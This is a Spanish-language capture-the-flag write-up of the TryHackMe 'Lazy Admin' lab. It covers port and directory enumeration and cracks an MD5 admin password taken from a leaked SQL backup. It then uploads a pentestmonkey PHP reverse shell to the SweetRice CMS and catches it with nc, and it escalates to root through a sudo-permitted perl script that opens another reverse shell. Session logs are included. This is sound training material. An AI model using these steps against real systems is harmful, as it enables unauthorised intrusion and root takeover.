---
title: TryHackMe Lazy Admin Writeup
published: true
---

La máquina Lazy Admin es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos tanto la flag del usuario como la de root.

# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-15 13:56 EDT
Initiating Ping Scan at 13:56
Scanning 10.10.141.160 [2 ports]
Completed Ping Scan at 13:56, 0.07s elapsed (1 total hosts)
Initiating Connect Scan at 13:56
Scanning 10.10.141.160 [65535 ports]
Discovered open port 80/tcp on 10.10.141.160
Discovered open port 22/tcp on 10.10.141.160
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.46% done; ETC: 13:56 (0:00:00 remaining)
Completed Connect Scan at 13:56, 24.56s elapsed (65535 total ports)
Nmap scan report for 10.10.141.160
Host is up, received syn-ack (0.080s latency).
Scanned at 2022-10-15 13:56:29 EDT for 24s
Not shown: 53479 filtered tcp ports (no-response), 12054 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.68 seconds
```

Puesto que el puerto 80 está abierto, introducimos la IP en nuestro navegador y nos muestra el servicio Apache. Podemos escanear los dos puertos para que nos reporta el servicio y la versión de cada uno con más información (podremos ver el Apache2):

```bash
❯ nmap -sCV -p22,80 10.10.141.160 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-15 14:01 EDT
Nmap scan report for 10.10.141.160
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds
[1]    4824 segmentation fault  nmap -sCV -p22,80 10.10.141.160 -oN targeted
```

Inspeccionamos el código pero no obtenemos mucha más información. 

Vamos a usar gobuster para conseguir directorios ocultos:

```bash
❯ gobuster dir -u http://10.10.141.160 -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.141.160
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/10/15 14:04:01 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/content              (Status: 301) [Size: 316] [--> http://10.10.141.160/content/]
/index.html           (Status: 200) [Size: 11321]                                  
/index.html           (Status: 200) [Size: 11321]                                  
/server-status        (Status: 403) [Size: 278]                                    
                                                                                   
===============================================================
2022/10/15 14:04:43 Finished
===============================================================
```

Encontramos el directorio /content

Nos metemos y observamos que podríamos tener potenciales vuknerabilidades mediante SweetRice pero optamos por volver a usar gobuster desde el directorio /content

```bash
❯ gobuster dir -u http://10.10.141.160/content -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.141.160/content
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2022/10/15 14:12:42 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/_themes              (Status: 301) [Size: 324] [--> http://10.10.141.160/content/_themes/]
/as                   (Status: 301) [Size: 319] [--> http://10.10.141.160/content/as/]     
/attachment           (Status: 301) [Size: 327] [--> http://10.10.141.160/content/attachment/]
/changelog.txt        (Status: 200) [Size: 18013]                                             
/images               (Status: 301) [Size: 323] [--> http://10.10.141.160/content/images/]    
/inc                  (Status: 301) [Size: 320] [--> http://10.10.141.160/content/inc/]       
/index.php            (Status: 200) [Size: 2199]                                              
/index.php            (Status: 200) [Size: 2199]                                              
/js                   (Status: 301) [Size: 319] [--> http://10.10.141.160/content/js/]        
/license.txt          (Status: 200) [Size: 15410]                                             
                                                                                              
===============================================================
2022/10/15 14:13:22 Finished
===============================================================
```

# [](#header-1)Entramos al sistema

Encontramos una serie de directorios ocultos. Tras observar todos el único en el que puede haber algo interesante es en /inc ya que encontramos un archivo que se llama mysql_bakup. Existe otro directorio para logearse pero no tenemos las credenciales por lo que me decanto por el archivo .sql

Me descargo el archivo y tras invesigarlo un poco encuentro credenciales para el login.

La contrasea esta cifrada en lo que parece md5. La desencriptamos y nos logeamos.

Funciona!

Navegamos por la web y encontramos un panel de subida de archivos en Media Center. Vamos a intentar subir una .php reverse shell y conseguir acceso al sistema. Para ello nos bajamos la reverse shell de <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">Pentest Monkey</a> y subirla. Antes debemos cambiar los parámetros de IP (en el que deberemos introducir la nuestra) y el puerto por el que nos vamos a poner en escucha con nc.

Ejecutamos la reverse shell y lo conseguimos

Investigamos y conseguimos la flag del usuario

```bash
❯ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.79.39] from (UNKNOWN) [10.10.141.160] 38076
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 21:37:38 up 43 min,  0 users,  load average: 0.00, 0.00, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cd /home 
$ ls
itguy
$ cd itguy 
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{??????????????????????????}
```

Hacemos sudo -l para ver los comandos que podemos ejecutar como root y nos reporta lo siguiente:

```bash
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

# [](#header-1)Escalada de privilegios

Podemos usar perl y abrir un archivo en /home/itguy/backup.pl

Abrimos el archivo y nos redirige a otro archivo que nos reporta una shell!

Deberemos cambiar la IP y el puerto en el que estamos por escucha desde nuestra máquina y ejecutar sudo /usr/bin/perl /home/itguy/backup.pl (usamos perl para ejecutar la shell que nos han proporcionado con la IP y el puerto cambiado). 

Conseguimos ser root y solo nos queda ir al directorio /root y abrir el archivo root.txt

```bash
❯ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.79.39] from (UNKNOWN) [10.10.141.160] 38086
/bin/sh: 0: can't access tty; job control turned off
# cd /root
# ls
root.txt
# cat root.txt
THM{??????????????????????}
```

Muchas gracias por leer este writeup, espero que te haya gustado!
